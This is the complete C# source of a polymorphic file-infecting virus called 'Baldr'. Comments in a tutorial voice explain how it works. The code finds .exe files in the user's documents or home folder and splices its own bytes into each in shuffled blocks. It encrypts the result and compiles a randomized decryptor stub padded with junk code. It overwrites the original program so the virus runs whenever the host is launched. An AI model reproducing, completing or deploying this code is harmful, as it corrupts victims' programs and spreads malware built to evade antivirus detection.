   using System;
   using System.IO;
   using System.Diagnostics;
   using System.Collections;
   using System.Security.Cryptography;
   using System.Text;
   using Microsoft.CSharp;
   using System.CodeDom.Compiler;

   namespace Baldr
   {
       public class Baldr
       {
           private string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
           private string myDir = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
           private string os = Convert.ToString(Environment.OSVersion).Substring(0, 4).ToLower();
           private string slash = @"\";
           private ArrayList arrShuffled;
           private ArrayList wordList = new ArrayList();

           public void Infect()
           {
               //if we are on linux
               //like I was when building this using mono
               //we must change our slashes

               if (os == "unix")
               {
                   slash = "/";
               }

               //grab all the exe files in the users
               //my documents folder or home folder in
               //unix

               string[] files = Directory.GetFiles(myDir, "*.exe");
               for (int i = 0; i < files.Length; i++)
               {
                   //read the host bytes and do a basic
                   //byte check.
                   byte[] hostBytes = readBytes(files[i]);
                   if (hostBytes[60] != 128)
                   {
                       Infectfile(files[i], hostBytes);
                   }
               }
           }

           private void Infectfile(string file, byte[] hostByte)
           {
               //create our byte array for the virus
               byte[] myBytes = readBytes(me);

               //generate a random 16 number
               //this will determine how many blocks
               //will be generated.
               int b = RandSixTeen(hostByte.Length);

               //calculate how much to write each block
               int hblocksize = (hostByte.Length / b);
               int vblocksize = (myBytes.Length / b);

               // here we build a sequence into how our file will
               // be divided up.
               // virus | host  | virus | host or
               // host  | virus | virus | host
               // we need to figure out what order to sort
               // based on the total of blocks from
               // both files
               arrShuffled = ShuffleArrayList((b * 2));

               //print out the arraylist order
               int i = 0;
               IEnumerator enumr = arrShuffled.GetEnumerator();
               string sequence = "";

               // 1 = virus
               // 0 = host
               int av = 0;
               int ah = 0;

               //our counters that
               //will use below to keep
               //track
               int ev = vblocksize;
               int eh = hblocksize;

               string cmbName = myDir + slash + RandomWords() + ".exe";
               FileStream fswHost = new FileStream(cmbName, FileMode.Create, FileAccess.Write);
               BinaryWriter bwHost = new BinaryWriter(fswHost);

               while (enumr.MoveNext())
               {
                   //based on our sequence we
                   //will decide which to write
                   //to join the files Equals(1) is the
                   //virus bytes and 0 is host

                   if (enumr.Current.Equals(1))
                   {
                       for (int j = av; j < ev; j++)
                       {
                           bwHost.BaseStream.WriteByte(myBytes[j]);
                       }

                       //increment our block size to keep
                       //our starting and ending offsets
                       //so the next time we write we know
                       //where to start and end
                       av = ev;
                       ev = ev + vblocksize;
                   }
                   else
                   {
                       //basically same deal as above
                       //but we have to do it seperatley
                       //to keep track of the hosts bytes

                       for (int j = ah; j < eh; j++)
                       {
                           bwHost.BaseStream.WriteByte(hostByte[j]);
                       }
                       ah = eh;
                       eh = eh + hblocksize;
                   }
                   sequence += enumr.Current;
                   i++;
               }

               //always remember to flush!
               //before you close. This is good practice
               //and under the rare occasion will determine
               //if you write bytes or not.

               fswHost.Flush();
               bwHost.Flush();
               bwHost.Close();
               fswHost.Close();

               //Once we have the sequence combined into one file we will encrypt it
               string rKey = RandomKey();
               string encFile = EncryptFile(cmbName, rKey);

               if (File.Exists(encFile))
               {
                   //if we generated our encrypted file based
                   //on the combo file then we can go ahead and
                   //remove it.

                   File.Delete(cmbName);

                   //setup the blocks
                   int block = b * 2;

                   FileInfo fi = new FileInfo(encFile);
                   int encLength = (int)fi.Length;

                   //generate our decryptor.
                   string decFile = Decryptor(file, sequence, block, myBytes.Length, hostByte.Length, encLength, rKey);

                   //check to make sure all our code compiled
                   //and we got a file else abort.
                   if (File.Exists(decFile))
                   {

                       //read the decryptor bytes then delete
                       byte[] decBytes = readBytes(decFile);
                       File.Delete(decFile);

                       //read the encrypted combined host + virus file
                       //then delete
                       byte[] encBytes = readBytes(encFile);
                       File.Delete(encFile);

                       if (File.Exists(file))
                       {
                           try
                           {
                               //delete the original file we are infecting
                               //we will then rebuild the file with our
                               //decryptor first and then the encrypted
                               //combined host + virus file
                               File.Delete(file);

                               FileStream fsb = new FileStream(file, FileMode.CreateNew);
                               BinaryWriter bwb = new BinaryWriter(fsb);
                               for (int x = 0; x < decBytes.Length; x++)
                               {
                                   //write the decryptors bytes
                                   bwb.BaseStream.WriteByte(decBytes[x]);
                               }
                               for (int w = 0; w < encBytes.Length; w++)
                               {
                                   //write the encrypted bytes
                                   bwb.BaseStream.WriteByte(encBytes[w]);
                               }
                               //flush and close
                               bwb.Flush();
                               bwb.Close();
                               fsb.Close();

                               //if we are in unix we must chmod+x the
                               //file first to make it executable
                               if (os == "unix")
                               {
                                   try
                                   {
                                       Process.Start("chmod +x " + file);
                                   }
                                   catch { }
                               }
                           }
                           catch (Exception er)
                           {
                               //uncomment for debugging this is a rare
                               //case but incase the file is locked we
                               //won't be able to mainpulate it

                               //Console.WriteLine("Error:" + er);
                               //Console.ReadLine();
                           }
                       }
                   }
                   else
                   {
                       //incase our decryptor didn't build
                       //or was deleted we will delete the
                       //encrypted combined file and do some
                       //clean up so we don't reinfect this
                       //file the next time.

                       if (File.Exists(encFile))
                       {
                           File.Delete(encFile);
                       }
                   }
               }
           }

           public string Decryptor(string f, string seq, int blocks, int vlength, int hlength, int elength, string p)
           {
               //generate a new random temp file name for our decryptor
               string name = myDir + slash + RandomWords() + ".exe";

               ICodeCompiler ic = new CSharpCodeProvider().CreateCompiler();
               CompilerParameters cp = new CompilerParameters();
               cp.ReferencedAssemblies.Add("System.dll");
               cp.GenerateExecutable = true;
               cp.CompilerOptions = "/target:winexe";
               cp.OutputAssembly = name;

               //we will use r or Random to determine
               //which code gets run and to randomly select
               //a marker
               Random r = new Random();

               //we build a hash table with all sorts of random words
               //this way we don't declare more variables and we can still
               //retrieve their value based on an index
               Hashtable hashish = new Hashtable();
               for (int hi = 0; hi < 50; hi++)
               {
                   string val = new RandomWord().RandomWords(r.Next(4, 12345));
                   if (wordList.IndexOf(val) != -1)
                   {
                       val += val + DateTime.Now.Millisecond;
                   }
                   wordList.Add(val);
                   hashish.Add(hi, val);
               }

               //Store all the directives into an array that we can randomly sort the order
               //then we then just concatenate them to the directives string for use later
               string[] direct = { "using System; \n", "using System.Security.Cryptography; \n", "using System.Text; \n", "using System.Diagnostics; \n", "using System.IO; \n" };
               Array.Sort(direct);

               string directives = "";
               for (int di = 0; di < direct.Length; di++)
               {
                   directives += direct[di];
               }

               //start the main namespace and class
               //the code is either going to use Main() or generate a new function that gets called
               //inside Main()
               string codestart = "namespace " + hashish[1] + "{ \n" +
               "   class " + hashish[2] + " { \n";

               if ((r.Next(2) % 2) == 0)
               {
                   codestart += " public static void Main() { \n";
               }
               else
               {
                   //our random function name that is called in Main()
                   codestart += " public static void Main() { \n" +
                   "   " + hashish[3] + "(); \n" +
                   "} \n" +
                   "private static void " + hashish[3] + "() { \n";
               }

               // host - encrypted file
               // pass in the total size of the encrypted file
               // then subtract this from the current file length
               // this will then get the starting offset on where to read the
               // encrypted bytes
               string ofFile = myDir + slash + hashish[4] + ".exe";
               string readEnc = "string " + hashish[5] + " = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName); \n" +
               "FileInfo " + hashish[6] + " = new FileInfo(" + hashish[5] + "); \n " +
               "int " + hashish[7] + " = (((int)" + hashish[6] + ".Length) - " + elength + "); \n" +
               "byte[] " + hashish[8] + " = new byte[" + hashish[6] + ".Length]; \n" +
               "FileStream " + hashish[9] + " = new FileStream(@" + hashish[5] + ", FileMode.Open, FileAccess.Read); \n" +
               "BinaryReader " + hashish[10] + " = new BinaryReader(" + hashish[9] + "); \n" +
               "for(int " + hashish[11] + " = 0; " + hashish[11] + " < " + hashish[8] + ".Length; " + hashish[11] + "++) { \n" +
               " " + hashish[8] + "[" + hashish[11] + "] = " + hashish[10] + ".ReadByte(); \n" +
               "} \n" +
               "" + hashish[10] + ".Close(); \n" +
               "" + hashish[9] + ".Close(); \n";

               string encFile = myDir + slash + RandomWords() + ".exe";
               string writeEnc = "FileStream " + hashish[12] + " = new FileStream(@\"" + encFile + "\", FileMode.Create, FileAccess.Write); \n " +
               "BinaryWriter " + hashish[13] + " = new BinaryWriter(" + hashish[12] + "); \n " +
               "for(int " + hashish[14] + " = " + hashish[7] + "; " + hashish[14] + " < " + hashish[8] + ".Length; " + hashish[14] + "++) { \n" +
               "" + hashish[13] + ".BaseStream.WriteByte(" + hashish[8] + "[" + hashish[14] + "]); \n" +
               "} \n" +
               "" + hashish[13] + ".Flush(); \n" +
               "" + hashish[13] + ".Close(); \n" +
               "" + hashish[12] + ".Close(); \n";

               string decrypt = "UnicodeEncoding " + hashish[15] + " = new UnicodeEncoding(); \n" +
               "byte[] " + hashish[16] + " = " + hashish[15] + ".GetBytes(\"" + p + "\"); \n" +
               "FileStream " + hashish[17] + " = new FileStream(@\"" + encFile + "\", FileMode.Open); \n" +
               "RijndaelManaged " + hashish[18] + " = new RijndaelManaged(); \n" +
               "CryptoStream " + hashish[19] + " = new CryptoStream(" + hashish[17] + ", " + hashish[18] + ".CreateDecryptor(" + hashish[16] + "," + hashish[16] + "), CryptoStreamMode.Read); \n" +
               "FileStream " + hashish[20] + " = new FileStream(@\"" + ofFile + "\", FileMode.Create); \n" +
               "int " + hashish[21] + "; \n" +
               "while((" + hashish[21] + " = " + hashish[19] + ".ReadByte()) != -1) { \n" +
               "   " + hashish[20] + ".WriteByte((byte)" + hashish[21] + "); \n" +
               "} \n" +
               "" + hashish[20] + ".Flush(); \n" +
               "" + hashish[20] + ".Close(); \n" +
               "" + hashish[19] + ".Close(); \n" +
               "" + hashish[17] + ".Close(); \n" +
               "File.Delete(@\"" + encFile + "\"); \n";

               //rebuildvars is nice, we can kind of move this around
               //to different parts of the code.
               string rebuildVars = "int " + hashish[22] + " = (" + blocks + " / 2); \n" +
               "int " + hashish[23] + " = (" + hlength + " / " + hashish[22] + "); \n" +
               "int " + hashish[24] + " = (" + vlength + " / " + hashish[22] + "); \n" +
               "byte[] " + hashish[26] + " = new byte[" + hlength + "]; \n" +
               "byte[] " + hashish[25] + " = new byte[" + vlength + "]; \n" +
               "int " + hashish[27] + " = 0; \n" +
               "int " + hashish[28] + " = 0; \n" +
               "int " + hashish[29] + " = " + hashish[24] + "; \n" +
               "int " + hashish[30] + " = " + hashish[23] + "; \n" +
               "string " + hashish[31] + " = \"" + seq + "\"; \n";

               string rebuild = "FileStream " + hashish[32] + " = new FileStream(@\"" + ofFile + "\", FileMode.Open, FileAccess.Read); \n" +
               "BinaryReader " + hashish[34] + " = new BinaryReader(" + hashish[32] + "); \n" +
               "CharEnumerator " + hashish[33] + " = " + hashish[31] + ".GetEnumerator(); \n" +
               "while(" + hashish[33] + ".MoveNext()) { \n" +
               "if(" + hashish[33] + ".Current.Equals('1')) { \n" +
               "   for(int " + hashish[36] + " = " + hashish[27] + "; " + hashish[36] + " < " + hashish[29] + "; " + hashish[36] + "++) { \n" +
               "       " + hashish[25] + "[" + hashish[36] + "] = " + hashish[34] + ".ReadByte(); \n" +
               "   } \n" +
               "   " + hashish[27] + " = " + hashish[29] + "; \n" +
               "   " + hashish[29] + " = " + hashish[29] + " + " + hashish[24] + "; \n" +
               "} else { \n" +
               "   for(int " + hashish[36] + " = " + hashish[28] + "; " + hashish[36] + " < " + hashish[30] + "; " + hashish[36] + "++) { \n" +
               "       " + hashish[26] + "[" + hashish[36] + "] = " + hashish[34] + ".ReadByte(); \n" +
               "   } \n" +
               "   " + hashish[28] + " = " + hashish[30] + "; \n" +
               "   " + hashish[30] + " = " + hashish[30] + " + " + hashish[23] + "; \n" +
               "} \n" +
               "} \n" +
               "" + hashish[34] + ".Close(); \n" +
               "" + hashish[32] + ".Close(); \n" +
               "File.Delete(@\"" + ofFile + "\"); \n";

               string hostfile = myDir + slash + RandomWords() + ".exe";
               string writeHostBytes = "FileStream " + hashish[37] + " = new FileStream(@\"" + hostfile + "\", FileMode.Create, FileAccess.Write); \n " +
               "BinaryWriter " + hashish[38] + " = new BinaryWriter(" + hashish[37] + "); \n " +
               "for(int " + hashish[40] + " = 0; " + hashish[40] + " < " + hashish[26] + ".Length; " + hashish[40] + "++) { \n" +
               "" + hashish[38] + ".BaseStream.WriteByte(" + hashish[26] + "[" + hashish[40] + "]); \n" +
               "} \n" +
               "" + hashish[38] + ".Flush(); \n" +
               "" + hashish[38] + ".Close(); \n" +
               "" + hashish[37] + ".Close(); \n";

               string executeHost = "\n try { \n" +
               "   if(Convert.ToString(Environment.OSVersion).Substring(0,4).ToLower() == \"unix\") { \n " +
               "       Process.Start(@\"chmod +x " + hostfile + "\").WaitForExit(); \n" +
               "   } \n" +
               "   Process.Start(@\"" + hostfile + "\").WaitForExit(); \n" +
               "   File.Delete(@\"" + hostfile + "\"); \n" +
               "} catch { } \n";

               string virusFile = myDir + slash + RandomWords() + ".exe";
               string writeVirusBytes = "FileStream " + hashish[41] + " = new FileStream(@\"" + virusFile + "\", FileMode.Create, FileAccess.Write); \n " +
               "BinaryWriter " + hashish[42] + " = new BinaryWriter(" + hashish[41] + "); \n " +
               "for(int " + hashish[39] + " = 0; " + hashish[39] + " < " + hashish[25] + ".Length; " + hashish[39] + "++) { \n" +
               "" + hashish[42] + ".BaseStream.WriteByte(" + hashish[25] + "[" + hashish[39] + "]); \n" +
               "} \n" +
               "" + hashish[42] + ".Flush(); \n" +
               "" + hashish[42] + ".Close(); \n" +
               "" + hashish[41] + ".Close(); \n";

               string executeVirus = "\n try { \n" +
               "   if(Convert.ToString(Environment.OSVersion).Substring(0,4).ToLower() == \"unix\") { \n " +
               "       Process.Start(@\"chmod +x " + virusFile + "\").WaitForExit(); \n" +
               "   } \n" +
               "   Process.Start(@\"" + virusFile + "\").WaitForExit(); \n" +
               "   File.Delete(@\"" + virusFile + "\"); \n" +
               "} catch { } \n";

               string end = "} \n" +
               "   } \n" +
               "} \n";

               //I've only done two different
               //types of simple body moving
               //here but you should be able to get
               //the idea. Both strings will have
               //trash and rebuildVars will be placed
               //into a different area.

               string d = "";
               if (r.Next(1, 100) % 2 == 1)
               {
                   d += directives + codestart + readEnc + writeEnc + Trash() + decrypt + rebuildVars + Trash() + rebuild + writeHostBytes + executeHost + writeVirusBytes + executeVirus + end;
               }
               else
               {
                   d += directives + codestart + Trash() + readEnc + Trash() + rebuildVars + writeEnc + Trash() + decrypt + Trash() + rebuild + writeHostBytes + Trash() + executeHost + writeVirusBytes + executeVirus + end;
               }


               //compile the file our string d holds all the
               //code strings now.
               CompilerResults results = ic.CompileAssemblyFromSource(cp, d);

               //if we were successfull in generating the exe we will
               //mark it as hiddent and then return the name so we
               //can resume program execution above.

               if (File.Exists(name))
               {
                   File.SetAttributes(name, FileAttributes.Hidden);
               }
               return name;
           }

           private string EncryptFile(string file, string p)
           {
               //encrypt file works on basically
               //like this we pass a file and
               //a dynamic key. We then use CryptoStream
               //to encrypt the file using the Rijndael algo

               UnicodeEncoding UE = new UnicodeEncoding();

               byte[] key = UE.GetBytes(p);
               string outf = myDir + slash + RandomWords() + ".exe";

               FileStream fsc = new FileStream(outf, FileMode.Create);
               RijndaelManaged cr = new RijndaelManaged();
               CryptoStream cs = new CryptoStream(fsc, cr.CreateEncryptor(key, key), CryptoStreamMode.Write);
               FileStream fsIn = new FileStream(file, FileMode.Open);

               int d;
               while ((d = fsIn.ReadByte()) != -1)
               {
                   cs.WriteByte((byte)d);
               }
               fsIn.Close();
               cs.Close();
               fsc.Close();

               return outf;
           }

           private int RandSixTeen(int s)
           {
               int[] intArr = new int[64];
               int l = 63;
               for (int i = 0; i < intArr.Length; i++)
               {
                   intArr[i] = 16 * (i + 1);
                   if (intArr[i] > s)
                   {
                       l = i - 1;
                       break;
                   }
               }
               Random r = new Random();
               return intArr[r.Next(0, l)];
           }

           private ArrayList ShuffleArrayList(int n)
           {
               //create an array list
               ArrayList arrList = new ArrayList();
               for (int i = 0; i < n; i++)
               {
                   if ((i % 2) == 0)
                   {
                       arrList.Add(0);
                   }
                   else
                   {
                       arrList.Add(1);
                   }
               }
               //randomly sort the arraylist then return it
               Random rnd = new Random();
               for (int inx = arrList.Count - 1; inx > 0; --inx)
               {
                   int pos = rnd.Next(inx);
                   object temp = arrList[inx];
                   arrList[inx] = arrList[pos];
                   arrList[pos] = temp;
               }
               return arrList;
           }

           public string RandomWords()
           {
               Random r = new Random(unchecked((int)DateTime.Now.Ticks));
               RandomWord rword = new RandomWord();
               string n = rword.RandomWords(r.Next(1234));
               if (wordList.Contains(n))
               {
                   wordList.Add(n + DateTime.Now.Second);
               }
               else
               {
                   wordList.Add(n);
               }
               return n;
           }

           public string Trash()
           {
               string t = "";
               for (int hi = 0; hi < 50; hi++)
               {
                   Random r = new Random();
                   string val = new RandomWord().RandomWords(r.Next(4, 100));
                   while(wordList.IndexOf(val) != -1)
                   {
                       val = new RandomWord().RandomWords(r.Next(4, 200));
                   }
                   if (r.Next(1, 100) % 2 == 1)
                   {
                       //comment code
                       t += "//" + val + " \n";
                   }
                   else
                   {
                       string vals = new RandomWord().RandomWords(r.Next(4, 300));
                       t += "string " + val + " = \"" + vals + "\"; \n";
                   }
                   wordList.Add(val);
               }
               return t;
           }

           public string RandomKey()
           {
               string c = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZMaDeByfReeOn";
               Random r = new Random(unchecked((int)DateTime.Now.Ticks));
               string n = "";
               for (int i = 0; i < r.Next(0, 100); i++)
               {
                   n += c[r.Next(c.Length)];
               }
               if (n.Length > 8)
               {
                   n = n.Substring(0, 8);
               }
               else
               {
                   int b = 8 - n.Length;
                   for (int i = 0; i < b; i++)
                   {
                       n += c[i];
                   }
               }
               return n;
           }

           private void writeBytes(string f, byte[] arrBytes)
           {
               FileStream fsw = new FileStream(f, FileMode.Create, FileAccess.Write);
               BinaryWriter bw = new BinaryWriter(fsw);
               for (int i = 0; i < arrBytes.Length; i++)
               {
                   bw.BaseStream.WriteByte(arrBytes[i]);
               }
               bw.Flush();
               bw.Close();
               fsw.Close();
           }

           private byte[] readBytes(string p)
           {
               FileStream fw = new FileStream(p, FileMode.Open, FileAccess.Read);
               BinaryReader br = new BinaryReader(fw);
               byte[] b = new byte[fw.Length];
               for (int f = 0; f < b.Length; f++)
               {
                   b[f] = br.ReadByte();
               }
               br.Close();
               fw.Close();
               return b;
           }
       }
   }
